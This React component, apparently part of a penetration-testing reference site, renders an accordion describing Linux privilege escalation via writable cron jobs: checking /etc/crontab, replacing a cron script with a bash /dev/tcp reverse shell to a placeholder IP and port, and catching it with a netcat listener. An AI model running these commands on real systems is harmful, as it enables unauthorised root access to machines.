import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const Cronjobs = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Cron jobs are used to run scripts at a specific time. By default,
              they run with the privilege of their owners and not the current
              user.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              See what cron job scripts are running by navigating to{" "}
              <Typography display="inline" className="highlight">
                /etc/crontab
              </Typography>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Change cronjob script to:</Typography>
            <Typography>
              <SyntaxHighlighter className="syntax" language="bash">
                {"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"}
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Start a netcat listener and wait for cron job to execute.
            </Typography>
            <Typography>
              <SyntaxHighlighter className="syntax" language="bash">
                {"nc -lnvp {PORT}"}
              </SyntaxHighlighter>
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default Cronjobs;
